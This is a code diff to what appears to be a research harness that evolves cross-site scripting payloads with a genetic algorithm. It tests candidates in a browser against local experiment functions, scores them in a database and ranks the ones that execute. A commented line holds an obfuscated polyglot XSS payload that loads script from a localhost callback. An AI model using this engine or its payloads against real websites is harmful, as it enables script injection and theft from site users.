@@ -1,4 +1,5 @@
 import uuid
+from bdb import effective
 from typing import Callable
 from bs4 import BeautifulSoup
 from deepdiff import DeepDiff
@@ -129,13 +130,61 @@ def experiment_on_function(driver: webdriver, payloads: list[Payload], experimen
         conn.commit()
 
 
-def evaluate_results():
-    #TODO return best candidates
-    return [Payload()]
+def evaluate_results(payload_population):
+    new_population = []
+    conn = psycopg2.connect(
+        host=DB_HOST,
+        port=DB_PORT,
+        database=DB_NAME,
+        user=DB_USER,
+        password=DB_PASS
+    )
+    cursor = conn.cursor()
+    for payload in payload_population:
+        cursor.execute("SELECT AVG(overall_score), COUNT(id) FROM xss_eval WHERE payload = %s", (str(payload),))
+        avg_score, experiment_count = cursor.fetchone()
+        cursor.execute("SELECT COUNT(id) FROM xss_eval WHERE payload = %s AND works = TRUE", (str(payload),))
+        execution_count = cursor.fetchone()[0]
+        effectivity = execution_count / experiment_count
+
+        print(payload, avg_score, effectivity)
+        if effectivity > 0:
+            new_population.append(payload)
+
+    return new_population
 
 def evolve_population(candidates: [Payload], population_size: int):
-    # TODO mutate candidates / generate new / select randomly
-    return [Payload()]
+    new_gen = []
+    for candidate in candidates:
+        for _ in range(3):
+            child = candidate.copy()
+            child.mutate()
+            new_gen.append(child)
+    for parent1 in candidates:
+        for parent2 in candidates:
+            if parent1 != parent2:
+                new_gen.append(cross_payloads(parent1, parent2))
+                new_gen.append(cross_payloads(parent2, parent1))
+    for _ in range(population_size):
+        new_gen.append(generate_payload())
+
+    selection = random.sample(new_gen, population_size)
+    return selection
+
+def find_best_payload_in_db():
+    conn = psycopg2.connect(
+        host=DB_HOST,
+        port=DB_PORT,
+        database=DB_NAME,
+        user=DB_USER,
+        password=DB_PASS
+    )
+    cursor = conn.cursor()
+    cursor.execute("SELECT payload, AVG(overall_score), COUNT(CASE WHEN works THEN 1 END) FROM (SELECT DISTINCT ON (payload, attacked_path) * FROM xss_eval) GROUP BY payload ORDER BY COUNT(CASE WHEN works THEN 1 END) DESC, AVG(overall_score) DESC")
+    for payload in cursor.fetchall():
+        if payload[2] == 0:
+            break
+        print(f"Execution count: {payload[2]}, Score: {payload[1]}, Payload: {payload[0]}")
 
 def run(experiment_functions: [Callable[[webdriver, str, str], str]], population_size: int = 50, iterations: int = 10):
     payload_population = [Payload() for _ in range(population_size)]
@@ -143,15 +192,15 @@ def run(experiment_functions: [Callable[[webdriver, str, str], str]], population
     for _ in range(iterations):
         for func in experiment_functions:
             experiment_on_function(driver, payload_population, func)
-        candidates = evaluate_results()
+        candidates = evaluate_results(payload_population)
         payload_population = evolve_population(candidates, population_size)
-    # TODO print results
+    find_best_payload_in_db()
 
 # payloads = ["\"<ScRiPt sRc=`http://localhost:5000/submit/<id>`></ScRiPt>nOeMbed><ScRiPt sRc='http://localhost:5000/submit/<id>'></ScRiPt>\"&gt;import(`http://localhost:5000/submit/<id>`) <!--hTmL>' oNLoAd= )texTarEa&gt;<iMg-<ScRiPt sRc=`http://localhost:5000/submit/<id>`></ScRiPt> oNFoCus=*/';/ifRaMe>hTmL> oNtOgGle=/*`>/sOurCe&gt; oNmOuSeLeaVe= > OnBlUr= <ScRiPt sRc='http://localhost:5000/submit/<id>'></ScRiPt>iMg/* onClICk=import(\"http://localhost:5000/submit/<id>\")", "sane"]
 EXPERIMENT_FUNCTIONS = [xss_reflected_eval, xss_reflected_get_firstname] # TODO add all
 
 if __name__ == '__main__':
-    run(EXPERIMENT_FUNCTIONS)
+    run(EXPERIMENT_FUNCTIONS, 10, 3)
     #driver = webdriver.Chrome()
     #payloads = [generate_payload() for _ in range(1, 50)]
     #single_experiment(driver, payloads, xss_reflected_eval)
